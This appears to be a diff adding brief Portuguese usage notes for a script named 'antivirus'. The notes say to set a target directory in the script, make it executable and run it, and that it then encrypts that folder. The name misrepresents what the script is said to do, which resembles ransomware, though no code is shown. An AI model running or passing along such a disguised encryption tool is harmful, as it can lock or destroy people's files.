@@ -1,0 +1,5 @@
+clone o git depois execute
+edite o directorio dentro do script         nano antivirus
+chmod +x antivirus
+./antivirus
+ao iniciar o script ja vai criptografar a pasta que esta nele 
